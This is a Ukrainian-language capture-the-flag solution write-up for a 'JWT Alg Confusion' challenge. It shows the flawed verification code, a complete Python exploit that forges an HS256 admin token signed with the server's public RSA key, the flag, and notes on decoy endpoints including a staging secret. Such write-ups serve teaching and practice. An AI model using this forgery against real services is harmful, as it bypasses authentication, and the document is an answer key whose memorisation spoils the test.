# 02. JWT Alg Confusion (200 балів) — розв'язок

Прапор: `CTF{jwt_4lg_c0nfus10n_byp4ss}`

## Вразливість

`/flag` приймає JWT і бере алгоритм із заголовка токена. Для `RS256` підпис
перевіряється публічним ключем, а для `HS256` той самий PEM використовується як
HMAC-секрет:

```python
if alg == 'HS256':
    expected = hmac.new(pem_pub.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
```

Публічний ключ відкритий на `/pub`, тому можна підписати власний токен як `HS256`,
використавши цей ключ як секрет. Це класична JWT algorithm confusion.

## Експлойт

```python
import base64, hashlib, hmac, json, requests

BASE = "http://10.10.15.124:8002"          # через VPN: http://172.28.0.12:5000
pem = requests.get(f"{BASE}/pub").text

def b64(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")

header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64(json.dumps({"role": "admin"}, separators=(",", ":")).encode())
signature = b64(hmac.new(pem.encode(), header + b"." + payload, hashlib.sha256).digest())
token = (header + b"." + payload + b"." + signature).decode()

r = requests.get(f"{BASE}/flag", headers={"Authorization": token})
print(r.text)
```

Сервер перевірить HMAC ключем-рядком PEM, побачить `role: admin` і віддасть прапор.

## Прапор

```text
CTF{jwt_4lg_c0nfus10n_byp4ss}
```

## Пастки

- `/old_pub` віддає інший (кешований) публічний ключ. Підпис HMAC ним не
  проходить перевірку на `/flag` — це глухий кут.
- `/dev/token` видає готовий `role: admin` токен, підписаний staging-секретом
  `titan-dev-secret-2023`, і додає фальшивий `legacy_flag`
  `CTF{jwt_hs256_st4g1ng_byp4ss}`. Токен не проходить: сервер довіряє лише `/pub`.
- `/robots.txt` навмисно показує обидві пастки. Справжній шлях — узяти ключ
  саме з `/pub` і підписати токен ним як HMAC-секретом.
